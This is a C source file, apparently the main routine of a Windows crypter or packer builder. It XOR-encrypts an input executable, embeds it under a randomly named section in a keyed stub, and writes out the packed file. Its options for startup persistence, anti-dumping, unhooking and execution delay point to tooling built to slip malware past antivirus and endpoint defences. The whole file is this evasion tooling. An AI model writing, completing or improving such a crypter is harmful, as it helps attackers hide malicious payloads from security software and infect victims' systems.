#define _CRT_SECURE_NO_WARNINGS 
#include "file_utils.h"
#include "pe_utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "crypto.h"
#include <time.h>
int main(int argc, char* argv[]) {
    const char* file_path = NULL;
    const char* stub_path = NULL;
    const char* output_path = NULL;
    int startup = 0, antidump = 0, unhook = 0, delay = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--file") == 0 && i + 1 < argc) {
            file_path = argv[++i];
            printf("File path: %s\n", file_path);
        }
        else if (strcmp(argv[i], "--stub") == 0 && i + 1 < argc) {
            stub_path = argv[++i];
            printf("Stub path: %s\n", stub_path);
        }
        else if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            output_path = argv[++i];
            printf("Output path: %s\n", output_path);
        }
        else if (strcmp(argv[i], "--startup") == 0 && i + 1 < argc) {
            startup = atoi(argv[++i]);
            printf("Startup: %d\n", startup);
        }
        else if (strcmp(argv[i], "--antidump") == 0 && i + 1 < argc) {
            antidump = atoi(argv[++i]);
            printf("Antidump: %d\n", antidump);
        }
        else if (strcmp(argv[i], "--unhook") == 0 && i + 1 < argc) {
            unhook = atoi(argv[++i]);
            printf("Unhook: %d\n", unhook);
        }
        else if (strcmp(argv[i], "--delay") == 0 && i + 1 < argc) {
            delay = atoi(argv[++i]);
            printf("Delay: %d\n", delay);
        }
    }

   

    if (!file_path || !stub_path || !output_path) {
        printf("Missing arguments\n");
        return -1;
    }


    srand((unsigned int)time(NULL));


    char encryption_key[KEY_LENGTH + 1];
    generate_random(encryption_key, KEY_LENGTH);

    char section[5];
    generate_random(section, 5);
    printf("\nGenerated encryption key: %s\n", encryption_key);
    printf("Key bytes: ");
    for (int i = 0; i < KEY_LENGTH; i++) {
        printf("%02X ", (unsigned char)encryption_key[i]);
    }
    printf("\n\n");

    printf("Creating copy with key replacement\n");
    char* keyed_path = create_stub_key(stub_path, encryption_key, startup, unhook, antidump, delay);
    if (!keyed_path) {
        printf("Failed in step 1: create_stub_copy_with_key\n");
        return -1;
    }
    printf("Successfully created keyed copy: %s\n\n", keyed_path);


    printf("Step 2: Reading and encrypting input file\n");
    HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open input file: %s (Error: %lu)\n", file_path, GetLastError());
        free(keyed_path);
        return -1;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        printf("Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        free(keyed_path);
        return -1;
    }

    unsigned char* file_data = (unsigned char*)malloc(file_size);
    if (!file_data) {
        printf("Failed to allocate memory for file data\n");
        CloseHandle(hFile);
        free(keyed_path);
        return -1;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, file_data, file_size, &bytesRead, NULL) || bytesRead != file_size) {
        printf("Failed to read input file (Error: %lu)\n", GetLastError());
        free(file_data);
        CloseHandle(hFile);
        free(keyed_path);
        return -1;
    }
    CloseHandle(hFile);


    printf("Encrypting %lu bytes of data with key\n", file_size);
    xor_encrypt(file_data, file_size, encryption_key, strlen(encryption_key));
  
    printf("\nCreating final copy with encrypted section\n");
    char dot[6] = ".";
    strcat(dot, section);
    char* final_path = create_final(keyed_path,  dot, file_data, file_size);
    if (!final_path) {
        printf("Failed to create final copy with encrypted section\n");
        free(file_data);
        free(keyed_path);
        return -1;
    }

    if (!MoveFileExA(final_path, output_path, MOVEFILE_REPLACE_EXISTING)) {
        printf("Failed to move final file to output path (Error: %lu)\n", GetLastError());
        free(file_data);
        free(keyed_path);
        free(final_path);
        return -1;
    }
    printf("\nSuccessfully created packed file: %s\n", output_path);

 
    free(file_data);
    free(keyed_path);
    free(final_path);

    return 0;
}